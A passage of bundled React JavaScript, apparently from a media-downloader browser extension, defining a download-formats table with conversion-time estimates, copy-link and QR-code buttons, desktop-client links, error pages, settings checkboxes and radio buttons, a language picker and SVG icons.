                        fill: color,
                        d:
                            "M10.9,6c-0.2-0.1-0.3,0-0.5,0.1s-0.2,0.3-0.2,0.4l-1.1,4.1L7.7, 5.5c0-0.1-0.1-0.3-0.2-0.4C7.3,5,7.2,5,7,5C6.9,5.1,6.8,5.2,6.7, 5.3L5.1,9.1H4.4c-0.1,0-0.3,0-0.4,0.1C4,9.3,3.9,9.4,3.9,9.6c0,0.2,0,0.3,0.2, 0.4c0.1,0.1,0.3,0.1,0.4,0.1l0.9,0l0,0c0.4,0,0.5-0.3,0.6-0.4l1.1-2.5l1.5, 5.5c0.1,0.2,0.1,0.3,0.2,0.4c0.1,0.1,0.2,0.1,0.4,0.1c0.1,0,0.2-0.1, 0.3-0.2c0.1-0.1,0.1-0.3,0.2-0.4l0,0l1.1-3.9l0.4,1.4h2.3c0.1,0,0.3-0.1, 0.4-0.1C13.9,9.9,14,9.8,14, 9.6s-0.1-0.3-0.1-0.4c-0.1-0.1-0.3-0.1-0.4-0.1h-1.5l-0.8-2.7C11.1,6.2,11.1, 6.1,10.9,6 M17.9,5.8c-0.1-0.1-0.3-0.2-0.4-0.2h-2.2c-0.1,0-0.3,0.1-0.4, 0.2c-0.1,0.1-0.1,0.2-0.2,0.3v8.5H3.3V3.3h11.4v1.4c0,0.1,0.1,0.3,0.2, 0.4c0.1,0.1,0.2,0.2,0.4,0.2s0.3,0,0.4-0.2c0.1-0.1,0.1-0.3, 0.2-0.4V3.3c0-0.3-0.1-0.5-0.4-0.7c-0.3-0.3-0.6-0.4-0.9-0.4h-2.1V0.6c0-0.1-0.1-0.3-0.2-0.4C12.1, 0.1,12,0,11.8,0c-0.2,0-0.3,0.1-0.4,0.2c-0.1,0.1-0.1,0.3-0.1, 0.4v1.7H9.6V0.6c0-0.1-0.1-0.3-0.2-0.4C9.3,0.1,9.2,0,9,0S8.7,0.1,8.6,0.2C8.5, 0.3,8.4,0.4,8.4,0.6v1.7H6.8V0.6c0-0.1,0-0.3-0.2-0.4C6.5,0.1,6.4,0,6.2,0C6, 0,5.9,0.1,5.8,0.2C5.7,0.3,5.7,0.4,5.7,0.6v1.7H3.5c-0.3,0-0.6,0.1-0.9,0.4C2.4, 2.8,2.3,3,2.2,3.3v2.4H0.6c-0.1,0-0.3,0.1-0.4,0.2C0.1,5.9,0,6,0,6.2c0,0.2,0.1, 0.3,0.2,0.4c0.1,0.1,0.3,0.2,0.4,0.2h1.7v1.7H0.6c-0.1,0-0.3,0.1-0.4,0.2C0.1,8.7, 0,8.8,0,9s0.1,0.3,0.2,0.4c0.1,0.1,0.3,0.2,0.4,0.2h1.7v1.7H0.6c-0.1,0-0.3,0.1-0.4, 0.1C0.1,11.5,0,11.6,0,11.8c0,0.2,0.1,0.3,0.2,0.4c0.1,0.1,0.3,0.2,0.4,0.2h1.7v2.3c0, 0.3,0.2,0.5,0.3,0.7c0.3,0.3,0.6,0.4,0.9,0.4h2.2v1.7c0,0.1,0.1,0.3,0.2,0.4C5.9,17.9, 6,18,6.2,18c0.2,0,0.3-0.1,0.4-0.1c0.1-0.1,0.2-0.3,0.2-0.4v-1.7h1.7v1.7c0,0.1,0.1,0.3, 0.2,0.4C8.7,17.9,8.8,18,9,18s0.3-0.1,0.4-0.1c0.1-0.1,0.2-0.3,0.2-0.4v-1.7h1.7v1.7c0, 0.1,0.1,0.3,0.1,0.4c0.1,0.1,0.2,0.1,0.4,0.1c0.2,0,0.3-0.1,0.4-0.1c0.1-0.1,0.2-0.3, 0.2-0.4v-1.7h2.3c0.3,0,0.5-0.1,0.7-0.4c0.3-0.3,0.4-0.6,0.4-0.9v-2.2h1.7c0.1,0,0.3-0.1, 0.4-0.2c0.1-0.1,0.1-0.2, 0.1-0.4c0-0.2-0.1-0.3-0.1-0.4c-0.1-0.1-0.3-0.1-0.4-0.1h-1.7V9.6h1.7c0.1,0,0.3-0.1, 0.4-0.2C17.9,9.3,18,9.2,18, 9s-0.1-0.3-0.1-0.4c-0.1-0.1-0.3-0.2-0.4-0.2h-1.7V6.8h1.7c0.1,0,0.3,0,0.4-0.2C17.9, 6.5,18,6.4,18,6.2C18,6,17.9,5.9,17.9,5.8z",
                    })
                ),
            conversion_time = ({ serviceName: serviceName, mediaType: mediaType, contentLength: contentLength }) => {
                const { stats: stats } = use_app_state(["stats"]),
                    { t: t } = useTranslation();
                if ("mp3" === mediaType) {
                    let conversionTime = get_conversion_time(serviceName, "download", stats[serviceName], contentLength) + get_conversion_time(serviceName, "mp4->mp3", stats[serviceName], contentLength);
                    if (conversionTime) {
                        conversionTime = Math.round(conversionTime);
                        const d = Math.floor(conversionTime / 86400),
                            h = Math.floor((conversionTime % 86400) / 3600),
                            m = Math.floor((conversionTime % 3600) / 60),
                            s = Math.floor(conversionTime % 60);
                        let conversionTimeStr = "";
                        return (
                            (conversionTimeStr += d > 0 ? `${d}{%day%} ${h}{%hour%}` : h > 0 ? `${h}{%hour%} ${m}{%minute%}` : m > 0 ? `${m}{%minute%} ${s}{%second%}` : (s > 0 ? s : 1) + "{%second%}"),
                            t("conversion_time")
                                .replace(/{%conversionTime%}/g, conversionTimeStr)
                                .replace(/{%day%}/g, t("day"))
                                .replace(/{%hour%}/g, t("hour"))
                                .replace(/{%minute%}/g, t("minute"))
                                .replace(/{%second%}/g, t("second"))
                        );
                    }
                }
                return t("conversion_required");
            },
            conversion_required_row = ({ data: data, serviceName: serviceName }) =>
                react_default.a.createElement(
                    react_default.a.Fragment,
                    null,
                    react_default.a.createElement(row_start, { data: data }),
                    react_default.a.createElement(cell, null, react_default.a.createElement(cpu_activity, null)),
                    react_default.a.createElement(cell, { colSpan: 3 }, react_default.a.createElement(conversion_time, { serviceName: serviceName, mediaType: data.type, contentLength: data.contentLength }))
                ),
            cells = ({ data: data }) => {
                const { serviceName: serviceName, status: status, displayQrCodes: displayQrCodes, addModal: addModal, sendEvent: sendEvent } = use_app_state(["serviceName", "status", "displayQrCodes", "addModal", "sendEvent"]),
                    [isNotificationShow, setIsNotificationShow] = Object(react.useState)(!1),
                    history = useHistory(),
                    { t: t } = useTranslation(),
                    { desktopClientName: desktopClientName } = config.a,
                    url = data.directUrl || data.url,
                    { canBeShared: canBeShared } = data,
                    showQr = displayQrCodes && canBeShared,
                    isMounted = use_is_mounted();
                return data.availableInDesktopClient
                    ? react_default.a.createElement(available_in_desktop_row, { data: data, desktopClientName: desktopClientName, status: status })
                    : data.conversionRequired
                    ? react_default.a.createElement(conversion_required_row, { data: data, serviceName: serviceName })
                    : react_default.a.createElement(
                          react_default.a.Fragment,
                          null,
                          react_default.a.createElement(row_start, { data: data }),
                          react_default.a.createElement(cell, { colSpan: 2 }, react_default.a.createElement(size, { media: data })),
                          !showQr && react_default.a.createElement(cell, null),
                          react_default.a.createElement(
                              cell,
                              null,
                              canBeShared &&
                                  react_default.a.createElement(
                                      ui_tooltip,
                                      { title: t("copy_link_to_clipboard_tooltip") },
                                      react_default.a.createElement(
                                          styled_button,
                                          {
                                              disabled: !url,
                                              onClick: (evt) => {
                                                  evt.preventDefault(), evt.stopPropagation();
                                                  const textArea = document.createElement("textarea");
                                                  (textArea.value = data.url),
                                                      document.body.appendChild(textArea),
                                                      textArea.select(),
                                                      document.execCommand("Copy"),
                                                      textArea.remove(),
                                                      isMounted() &&
                                                          !isNotificationShow &&
                                                          (setIsNotificationShow(!0),
                                                          addModal({
                                                              type: "notification",
                                                              props: {
                                                                  icon: react_default.a.createElement(check, null),
                                                                  message: t("copy_link_to_clipboard_notification_message"),
                                                                  onClose: () => {
                                                                      isMounted() && setIsNotificationShow(!1);
                                                                  },
                                                              },
                                                          }));
                                              },
                                          },
                                          react_default.a.createElement(icons_copy, null)
                                      )
                                  )
                          ),
                          showQr &&
                              react_default.a.createElement(
                                  cell,
                                  null,
                                  react_default.a.createElement(
                                      ui_tooltip,
                                      { title: t("qr_code_tooltip") },
                                      react_default.a.createElement(
                                          styled_button,
                                          {
                                              onClick: (evt) => {
                                                  evt.preventDefault(),
                                                      evt.stopPropagation(),
                                                      sendEvent({ action: "show_qr_code", url: data.url }),
                                                      console.log("TRACING QR CODE!!!", encodeURIComponent(data.url)),
                                                      history.push("/qrcode/" + encodeURIComponent(data.url));
                                              },
                                          },
                                          react_default.a.createElement(qr_code, null)
                                      )
                                  )
                              )
                      );
            };
        var formats_table_row = ({ data: data }) => {
                const { theme: theme, sendEvent: sendEvent, download: download, info: info, setDefaultItem: setDefaultItem, warnBeforeConverting: warnBeforeConverting, getServiceUrl: getServiceUrl } = use_app_state([
                        "theme",
                        "sendEvent",
                        "download",
                        "info",
                        "setDefaultItem",
                        "warnBeforeConverting",
                        "getServiceUrl",
                    ]),
                    history = useHistory(),
                    { i18n: i18n } = useTranslation();
                if (data) {
                    const formatsTable = theme && theme.formats_table,
                        rowBorder = formatsTable && formatsTable.row_border,
                        rowHoverBackground = formatsTable && formatsTable.row_hover_background;
                    return react_default.a.createElement(
                        row,
                        {
                            border: "1px solid " + (rowBorder || "black"),
                            hoverBackground: rowHoverBackground || "rgba(0,0,0,0.3)",
                            onClick: (evt) => {
                                evt.preventDefault();
                                const landingUrl = getServiceUrl(info.canonicalUrl || window.location.href, i18n.language);
                                if (data.availableInDesktopClient)
                                    if ("audio/mp3" !== data.mimeType || data.bitrate) {
                                        const { fps: fps } = data,
                                            tf = `client-mp4-${data.height}${fps > 30 ? "-" + fps : ""}`;
                                        window.open(`${landingUrl}&tf=${tf}`, "_blank"), sendEvent({ action: "landing_video", format: data.quality });
                                    } else window.open(landingUrl + "&tf=client-mp3", "_blank"), sendEvent({ action: "landing_audio", format: "" });
                                else data.conversionRequired && warnBeforeConverting ? (setDefaultItem(data), history.push("/confirm")) : download(data);
                            },
                        },
                        react_default.a.createElement(cells, { data: data })
                    );
                }
                return null;
            },
            landing_row = () => {
                const { theme: theme, status: status, info: info, getServiceUrl: getServiceUrl, sendEvent: sendEvent } = use_app_state(["theme", "status", "info", "getServiceUrl", "sendEvent"]),
                    { t: t, i18n: i18n } = useTranslation(),
                    { desktopClientName: desktopClientName, webPortalHostname: webPortalHostname } = config.a,
                    formatsTable = theme && theme.formats_table,
                    rowBorder = formatsTable && formatsTable.row_border,
                    rowHoverBackground = formatsTable && formatsTable.row_hover_background;
                return react_default.a.createElement(
                    row,
                    {
                        border: "1px solid " + (rowBorder || "black"),
                        hoverBackground: rowHoverBackground || "rgba(0,0,0,0.3)",
                        onClick: (evt) => {
                            evt.preventDefault();
                            const landingUrl = getServiceUrl(info.canonicalUrl || window.location.href, i18n.language);
                            window.open(landingUrl, "_blank"), sendEvent({ action: "landing", format: "" });
                        },
                    },
                    react_default.a.createElement(cell, null, react_default.a.createElement(icon_logo, null)),
                    react_default.a.createElement(
                        cell,
                        { colSpan: 5 },
                        "idle" === status ? t("download_using_desktop_client", { desktopClientName: desktopClientName }) : t("download_via_web_portal", { webPortalHostname: webPortalHostname })
                    ),
                    react_default.a.createElement(tooltip_cell, { status: status })
                );
            };
        const Table = styled_components_browser_esm.a.table.withConfig({ displayName: "formats-table__Table", componentId: "sc-yc06lo-0" })`border-collapse:separate;border-spacing:0;width:100%;position:relative;empty-cells:hide;`;
        var formats_table = ({ data: data }) => {
            const { serviceUrl: serviceUrl } = config.a,
                { module: module, bodyScrollbarWidth: bodyScrollbarWidth } = use_app_state(["module", "bodyScrollbarWidth"]),
                { getScrollContainer: getScrollContainer } = module,
                moduleScrollContainer = getScrollContainer && getScrollContainer();
            return react_default.a.createElement(
                scroll_container,
                { maxHeight: moduleScrollContainer || bodyScrollbarWidth ? 420 : null, scrollPaddingBottom: 8 },
                react_default.a.createElement(
                    Table,
                    null,
                    react_default.a.createElement(
                        "tbody",
                        null,
                        data.map((rec) => react_default.a.createElement(formats_table_row, { key: `${rec.id}_${rec.mimeType}_${rec.type}`, data: rec })),
                        serviceUrl && react_default.a.createElement(landing_row, null)
                    )
                )
            );
        };
        const main_Button = styled_components_browser_esm.a.button.withConfig({
                displayName: "main__Button",
                componentId: "sc-n0iopr-0",
            })`background-color:transparent;outline:none;border:none;display:flex;align-items:center;margin:4px auto;padding:6px 3px;cursor:pointer;&:not(:hover){& svg path{fill:${(props) => props.buttonColor};}& span{color:${(props) =>
                props.buttonColor};}}&:hover{& svg path{fill:${(props) => props.buttonHoverColor};}& span{color:${(props) => props.buttonHoverColor};}}& svg{margin:0 3px;}`,
            main_Text = styled_components_browser_esm.a.span.withConfig({ displayName: "main__Text", componentId: "sc-n0iopr-1" })`font-family:Arial,Helvetica,sans-serif;font-weight:400;font-size:14px;margin:0 3px;padding:0;`,
            main_Header = styled_components_browser_esm.a.h4.withConfig({ displayName: "main__Header", componentId: "sc-n0iopr-2" })`margin:16px;font-size:16px;font-weight:400;line-height:24px;color:${(props) =>
                props.color || "black"};& a{text-decoration:underline;cursor:pointer;color:${(props) => props.color || "black"};}`,
            DownloadErrorContainer = styled_components_browser_esm.a.div.withConfig({
                displayName: "main__DownloadErrorContainer",
                componentId: "sc-n0iopr-3",
            })`display:flex;flex-direction:row;align-items:center;justify-content:space-between;margin:2px 16px 16px;& span{color:${(props) =>
                props.color};width:calc(100% - 80px);line-height:20px;}& svg{width:60px;height:56px;& path{fill:${(props) => props.iconColor};}}`,
            Spoiler = () => {
                const { listMode: listMode, listHasSpoiler: listHasSpoiler, theme: theme, sendEvent: sendEvent, setListMode: setListMode } = use_app_state(["listMode", "listHasSpoiler", "theme", "sendEvent", "setListMode"]),
                    history = useHistory(),
                    { t: t } = useTranslation();
                if ("short" !== listMode || !listHasSpoiler) return null;
                const buttonStyles = theme && theme.icon_button,
                    buttonColor = buttonStyles && buttonStyles.color,
                    buttonHoverColor = buttonStyles && buttonStyles.hover;
                return react_default.a.createElement(
                    main_Button,
                    {
                        onClick: () => {
                            setListMode("full"), sendEvent({ action: "more" }), history.push("/more");
                        },
                        buttonColor: buttonColor,
                        buttonHoverColor: buttonHoverColor,
                    },
                    react_default.a.createElement(plus, null),
                    react_default.a.createElement(main_Text, null, t("more_formats"))
                );
            },
            Formats = () => {
                const { itemsList: itemsList, listMode: listMode } = use_app_state(["itemsList", "listMode"]),
                    { t: t } = useTranslation(),
                    title = t("short" === listMode ? "formats_for_download" : "all_formats_for_download");
                return react_default.a.createElement(page, { title: title }, react_default.a.createElement(formats_table, { data: itemsList }), react_default.a.createElement(Spoiler, null));
            },
            main_handleClick = (e) => {
                "a" === e.target.localName && "reload" === e.target.getAttribute("data-webext-function") && (e.preventDefault(), e.stopPropagation(), window.location.reload());
            },
            Unavailable = () => {
                const { t: t } = useTranslation(),
                    { theme: theme } = use_app_state(["theme"]),
                    color = theme && theme.header;
                return (
                    use_event_listener(window, "click", main_handleClick),
                    react_default.a.createElement(
                        page,
                        null,
                        react_default.a.createElement(main_Header, { color: color, dangerouslySetInnerHTML: { __html: t("direct_links_unavailable") } }),
                        react_default.a.createElement(formats_table, { data: [] })
                    )
                );
            },
            DownloadError = () => {
                const { t: t } = useTranslation(),
                    { theme: theme } = use_app_state(["theme"]),
                    globals = theme && theme.globals,
                    color = globals && globals.color,
                    modalNotification = theme && theme.modal_notification,
                    iconColor = modalNotification && modalNotification.notification_icon;
                return react_default.a.createElement(
                    page,
                    null,
                    react_default.a.createElement(DownloadErrorContainer, { color: color, iconColor: iconColor }, react_default.a.createElement(lightning, null), react_default.a.createElement(main_Text, null, t("download_error"))),
                    react_default.a.createElement(formats_table, { data: [] })
                );
            };
        var main = () => {
            const { status: status } = use_app_state(["status"]);
            return "unavailable" === status || "error" === status
                ? react_default.a.createElement(Unavailable, null)
                : "downloadError" === status
                ? react_default.a.createElement(DownloadError, null)
                : react_default.a.createElement(Formats, null);
        };
        const checkboxNamePrefix = random_name_generator(12),
            Input = styled_components_browser_esm.a.input.withConfig({
                displayName: "checkbox__Input",
                componentId: "sc-o35yd5-0",
            })`display:none;&:not(:checked) + label::after{opacity:0;}&:checked + label::after{opacity:1;}&:not(:disabled) + label{cursor:pointer;}&:disabled + label{opacity:0.5;}`,
            Label = styled_components_browser_esm.a.label.withConfig({ displayName: "checkbox__Label", componentId: "sc-o35yd5-1" })`position:relative;display:block;font-size:14px;line-height:18px;${(props) =>
                "rtl" === props.dir ? "padding-right: 25px;" : "padding-left: 25px;"} color:${(props) => props.color};&::before,&::after{content:" ";display:block;position:absolute;}&::before{top:0;${(props) =>
                "rtl" === props.dir ? "right: 0;" : "left: 0;"} width:18px;height:18px;border-radius:3px;box-sizing:border-box;border:2px solid  ${(props) => props.border};background-color:${(props) =>
                props.background};}&::after{width:3px;height:7px;top:3px;${(props) => ("rtl" === props.dir ? "right: 7px;" : "left: 7px;")} border-right:2px solid ${(props) => props.checkmark};border-bottom:2px solid ${(props) =>
                props.checkmark};transform:rotate(45deg);}`;
        var ui_checkbox = ({ id: id, name: name, label: label, checked: checked, disabled: disabled, onChange: onChange }) => {
            const { dir: dir, theme: theme } = use_app_state(["dir", "theme"]),
                checkboxId = id && `${checkboxNamePrefix}-checkbox-${id}`,
                checkboxName = name && `${checkboxNamePrefix}-checkbox-${name}`,
                checkboxStyles = theme && theme.checkbox,
                color = checkboxStyles && checkboxStyles.color,
                background = checkboxStyles && checkboxStyles.background,
                border = checkboxStyles && checkboxStyles.border,
                checkmark = checkboxStyles && checkboxStyles.checkmark;
            return react_default.a.createElement(
                react_default.a.Fragment,
                null,
                react_default.a.createElement(Input, { type: "checkbox", id: checkboxId, name: checkboxName, checked: checked, disabled: id && disabled, onChange: onChange }),
                react_default.a.createElement(Label, { htmlFor: checkboxId, dir: dir, color: color, background: background, border: border, checkmark: checkmark }, label)
            );
        };
        var settings_show_formats_available_via_desktop_client = () => {
            const { t: t } = useTranslation(),
                { showFormatsAvailableViaDesktopClient: showFormatsAvailableViaDesktopClient, setShowFormatsAvailableViaDesktopClient: setShowFormatsAvailableViaDesktopClient } = use_app_state([
                    "showFormatsAvailableViaDesktopClient",
                    "setShowFormatsAvailableViaDesktopClient",
                ]),
                { desktopClientName: desktopClientName } = config.a;
            return react_default.a.createElement(ui_checkbox, {
                id: "showFormatsAvailableViaDesktopClient",
                label: t("settings.show_formats_available_via_desktop_client", { desktopClientName: desktopClientName }),
                checked: showFormatsAvailableViaDesktopClient,
                onChange: () => setShowFormatsAvailableViaDesktopClient(!showFormatsAvailableViaDesktopClient),
            });
        };
        var settings_show_formats_required_online_conversion = () => {
            const { t: t } = useTranslation(),
                { showFormatsRequiredOnlineConversion: showFormatsRequiredOnlineConversion, setShowFormatsRequiredOnlineConversion: setShowFormatsRequiredOnlineConversion } = use_app_state([
                    "showFormatsRequiredOnlineConversion",
                    "setShowFormatsRequiredOnlineConversion",
                ]);
            return react_default.a.createElement(ui_checkbox, {
                id: "showFormatsRequiredOnlineConversion",
                label: t("settings.show_formats_required_online_conversion"),
                checked: showFormatsRequiredOnlineConversion,
                onChange: () => setShowFormatsRequiredOnlineConversion(!showFormatsRequiredOnlineConversion),
            });
        };
        var settings_show_webm_videos = () => {
            const { t: t } = useTranslation(),
                { showWebmVideos: showWebmVideos, setShowWebmVideos: setShowWebmVideos } = use_app_state(["showWebmVideos", "setShowWebmVideos"]);
            return react_default.a.createElement(ui_checkbox, { id: "showWebmVideos", label: t("settings.show_webm"), checked: showWebmVideos, onChange: () => setShowWebmVideos(!showWebmVideos) });
        };
        var settings_warn_before_converting = () => {
            const { t: t } = useTranslation(),
                { warnBeforeConverting: warnBeforeConverting, setWarnBeforeConverting: setWarnBeforeConverting } = use_app_state(["warnBeforeConverting", "setWarnBeforeConverting"]);
            return react_default.a.createElement(ui_checkbox, { id: "warnBeforeConverting", label: t("settings.warn_before_converting"), checked: warnBeforeConverting, onChange: () => setWarnBeforeConverting(!warnBeforeConverting) });
        };
        var settings_display_qr_codes = () => {
            const { t: t } = useTranslation(),
                { displayQrCodes: displayQrCodes, setDisplayQrCodes: setDisplayQrCodes } = use_app_state(["displayQrCodes", "setDisplayQrCodes"]);
            return react_default.a.createElement(ui_checkbox, { id: "displayQrCodes", label: t("settings.display_qr_codes"), checked: displayQrCodes, onChange: () => setDisplayQrCodes(!displayQrCodes) });
        };
        var settings_show_snapshot_button = () => {
            const { t: t } = useTranslation(),
                { showSnapshotButton: showSnapshotButton, setShowSnapshotButton: setShowSnapshotButton } = use_app_state(["showSnapshotButton", "setShowSnapshotButton"]);
            return react_default.a.createElement(ui_checkbox, {
                id: "showSnapshotButton",
                label: t("settings.show_snapshot_button"),
                checked: showSnapshotButton,
                onChange: () => {
                    setShowSnapshotButton(!showSnapshotButton);
                },
            });
        };
        const radioButtonNamePrefix = random_name_generator(12),
            radio_button_Input = styled_components_browser_esm.a.input.withConfig({
                displayName: "radio-button__Input",
                componentId: "sc-1syqngq-0",
            })`display:none;&:not(:checked) + label::after{opacity:0;}&:checked + label::after{opacity:1;}&:not(:disabled):not(:checked) + label{cursor:pointer;}&:disabled + label{opacity:0.5;}`,
            radio_button_Label = styled_components_browser_esm.a.label.withConfig({ displayName: "radio-button__Label", componentId: "sc-1syqngq-1" })`position:relative;display:block;font-size:14px;line-height:18px;${(props) =>
                "rtl" === props.dir ? "padding-right: 25px;" : "padding-left: 25px;"} color:${(props) =>
                props.color};&::before,&::after{content:" ";display:block;position:absolute;border-radius:50%;box-sizing:border-box;}&::before{top:0;${(props) =>
                "rtl" === props.dir ? "right: 0;" : "left: 0;"} width:18px;height:18px;border:2px solid  ${(props) => props.border};background-color:${(props) => props.background};}&::after{width:10px;height:10px;top:4px;${(props) =>
                "rtl" === props.dir ? "right: 4px;" : "left: 4px;"} border:5px solid  ${(props) => props.border};}`;
        var radio_button = ({ id: id, name: name, label: label, checked: checked, disabled: disabled, onChange: onChange }) => {
            const { dir: dir, theme: theme } = use_app_state(["dir", "theme"]),
                radioButtonId = id && `${radioButtonNamePrefix}-radio-button-${id}`,
                radioButtonName = name && `${radioButtonNamePrefix}-radio-button-${name}`,
                radioButtonStyles = theme && theme.radio_button,
                color = radioButtonStyles && radioButtonStyles.color,
                background = radioButtonStyles && radioButtonStyles.background,
                border = radioButtonStyles && radioButtonStyles.border,
                checkmark = radioButtonStyles && radioButtonStyles.checkmark;
            return react_default.a.createElement(
                react_default.a.Fragment,
                null,
                react_default.a.createElement(radio_button_Input, { type: "radio", id: radioButtonId, name: radioButtonName, checked: checked, disabled: id && disabled, onChange: onChange }),
                react_default.a.createElement(radio_button_Label, { htmlFor: radioButtonId, dir: dir, color: color, background: background, border: border, checkmark: checkmark }, label)
            );
        };
        const app_button_style_Title = styled_components_browser_esm.a.h4.withConfig({ displayName: "app-button-style__Title", componentId: "sc-zf0cwn-0" })`font-size:16px;font-weight:400;padding:14px 0;`;
        var settings_app_button_style = () => {
            const { t: t } = useTranslation(),
                { appButtonStyle: appButtonStyle, setAppButtonStyle: setAppButtonStyle } = use_app_state(["appButtonStyle", "setAppButtonStyle"]);
            return react_default.a.createElement(
                react_default.a.Fragment,
                null,
                react_default.a.createElement(app_button_style_Title, null, t("settings.title_app_button_style")),
                react_default.a.createElement(radio_button, {
                    id: "appButtonStyleModern",
                    name: "settingsAppButtonStyle",
                    label: t("settings.app_button_style_modern"),
                    checked: "Modern" === appButtonStyle,
                    onChange: () => {
                        setAppButtonStyle("Modern");
                    },
                }),
                react_default.a.createElement(radio_button, {
                    id: "appButtonStyleClassic",
                    name: "settingsAppButtonStyle",
                    label: t("settings.app_button_style_classic"),
                    checked: "Classic" === appButtonStyle,
                    onChange: () => {
                        setAppButtonStyle("Classic");
                    },
                })
            );
        };
        const select_lang_Container = styled_components_browser_esm.a.div.withConfig({ displayName: "select-lang__Container", componentId: "sc-yqnxnt-0" })`display:flex;`,
            select_lang_Row = styled_components_browser_esm.a.div.withConfig({ displayName: "select-lang__Row", componentId: "sc-yqnxnt-1" })`&:last-child{margin:0 40px;}`,
            select_lang_Title = styled_components_browser_esm.a.h4.withConfig({ displayName: "select-lang__Title", componentId: "sc-yqnxnt-2" })`font-size:16px;font-weight:400;padding:14px 0;`;
        const settings_AppButtonStyleSettings = settings_app_button_style,
            settings_LangSettings = () => {
                const { lang: lang, setLang: setLang } = use_app_state(["lang", "setLang"]),
                    { t: t } = useTranslation();
                return react_default.a.createElement(
                    react_default.a.Fragment,
                    null,
                    react_default.a.createElement(select_lang_Title, null, t("language")),
                    react_default.a.createElement(
                        select_lang_Container,
                        null,
                        react_default.a.createElement(
                            select_lang_Row,
                            null,
                            react_default.a.createElement(radio_button, { id: "autoDetect", name: "settingsLanguage", label: t("auto_detect"), checked: "autoDetect" === lang, onChange: () => setLang("autoDetect") }),
                            react_default.a.createElement(radio_button, { id: "en", name: "settingsLanguage", label: "English", checked: "en" === lang, onChange: () => setLang("en") }),
                            react_default.a.createElement(radio_button, { id: "es", name: "settingsLanguage", label: "Español", checked: "es" === lang, onChange: () => setLang("es") })
                        ),
                        react_default.a.createElement(
                            select_lang_Row,
                            null,
                            react_default.a.createElement(radio_button, { id: "fr", name: "settingsLanguage", label: "Français", checked: "fr" === lang, onChange: () => setLang("fr") }),
                            react_default.a.createElement(radio_button, { id: "ru", name: "settingsLanguage", label: "Русский", checked: "ru" === lang, onChange: () => setLang("ru") }),
                            react_default.a.createElement(radio_button, { id: "zh", name: "settingsLanguage", label: "中文", checked: "zh" === lang, onChange: () => setLang("zh") })
                        )
                    )
                );
            },
            settings_Container = styled_components_browser_esm.a.div.withConfig({ displayName: "settings__Container", componentId: "sc-1mgzs0q-0" })`margin:8px 16px 24px;& label{margin-bottom:16px;}& h4{color:${(props) => props.color}}`,
            PageContainer = ({ children: children }) => {
                const { t: t } = useTranslation(),
                    { theme: theme } = use_app_state(["theme"]),
                    globals = theme && theme.globals,
                    color = globals && globals.color;
                return react_default.a.createElement(page, { title: t("settings.title") }, react_default.a.createElement(settings_Container, { color: color }, children));
            },
            MainSettings = () => {
                const { desktopClientUrl: desktopClientUrl, desktopClientName: desktopClientName } = config.a,
                    { serviceName: serviceName } = use_app_state(["serviceName"]);
                return react_default.a.createElement(
                    react_default.a.Fragment,
                    null,
                    desktopClientUrl && desktopClientName && react_default.a.createElement(settings_show_formats_available_via_desktop_client, null),
                    react_default.a.createElement(settings_show_formats_required_online_conversion, null),
                    react_default.a.createElement(settings_show_webm_videos, null),
                    react_default.a.createElement(settings_warn_before_converting, null),
                    "ok" !== serviceName && react_default.a.createElement(settings_display_qr_codes, null),
                    "ig" !== serviceName && react_default.a.createElement(settings_show_snapshot_button, null)
                );
            };
        var settings = () =>
            react_default.a.createElement(
                PageContainer,
                null,
                react_default.a.createElement(MainSettings, null),
                react_default.a.createElement(settings_AppButtonStyleSettings, null),
                react_default.a.createElement(settings_LangSettings, null)
            );
        const scrollTo = (element, to, duration) => {
            if (duration <= 0) return;
            const { scrollTop: scrollTop } = element,
                perTick = ((to - scrollTop) / duration) * 10;
            setTimeout(() => {
                Object.assign(element, { scrollTop: scrollTop + perTick }), element.scrollTop !== to && scrollTo(element, to, duration - 10);
            }, 10);
        };
        var scroll_to = scrollTo;
        var enquiry = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "23px", height: "14px", viewBox: "0 0 23 14", style: style, className: className },
                react_default.a.createElement("path", {
                    fill: color,
                    d: "M5.2,2.5H5c-1.2,0-2.2,1-2.2,2.2v0.5h1.4V4.7c0-0.5,0.4-0.9,0.9-0.9h0.3c0.5, 0,0.9,0.4,0.9,0.9c0,0.3-0.2,0.6-0.5,0.8L4.1,6.4v2.2h1.4V7.2l0.9-0.5c0.7-0.4, 1.2-1.1,1.2-2C7.5,3.5,6.4,2.5,5.2,2.5z",
                }),
                react_default.a.createElement("path", { fill: color, d: "M4.1,9.9h1.4v1.4H4.1V9.9z" }),
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        "M20.7,0H2.3C1,0,0,1,0,2.3v9.4C0,13,1,14,2.3,14h18.4c1.3,0,2.3-1,2.3-2.3V2.3C23, 1,22,0,20.7,0z M1.4,11.7V2.3c0-0.5,0.4-1,1-1h6.5v11.3H2.3C1.8,12.6,1.4,12.2,1.4, 11.7z M21.7,11.7c0,0.5-0.4,1-1,1H10.2V1.4h10.6c0.5,0,1,0.4,1,1V11.7z",
                }),
                react_default.a.createElement("path", { fill: color, d: "M11.5,3.6h8.8V5h-8.8V3.6z" }),
                react_default.a.createElement("path", { fill: color, d: "M11.5,6.3h6.1v1.4h-6.1V6.3z" }),
                react_default.a.createElement("path", { fill: color, d: "M11.5,9h4.1v1.4h-4.1V9z" })
            );
        var angle_down = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "13.7px", height: "8px", viewBox: "0 0 13.7 8", style: style, className: className },
                react_default.a.createElement("path", {
                    fill: color,
                    d: "M13.5,0.2c-0.2-0.2-0.6-0.2-0.8,0L6.9,6.6L1,0.2c-0.2-0.2-0.6-0.2-0.8, 0s-0.2,0.6,0,0.8l6.2,6.9C6.5,8,6.7,8,6.8,8C7,8,7.2,8,7.3,7.8L13.5, 1C13.8,0.8,13.8,0.4,13.5,0.2z",
                })
            );
        const item_Input = styled_components_browser_esm.a.input.withConfig({ displayName: "item__Input", componentId: "sc-40hkay-0" })`display:none;&:not(:checked) + label{& div + svg{transform:${(props) =>
                props.iconTransform};}& + div{height:0;}}&:checked + label + div{height:${(props) => props.contentHeight && props.contentHeight + "px"};}`,
            item_Label = styled_components_browser_esm.a.label.withConfig({
                displayName: "item__Label",
                componentId: "sc-40hkay-1",
            })`cursor:pointer;display:flex;justify-content:space-between;align-items:center;border-radius:2px;min-height:30px;background-color:${(props) => props.headerBackground};color:${(props) =>
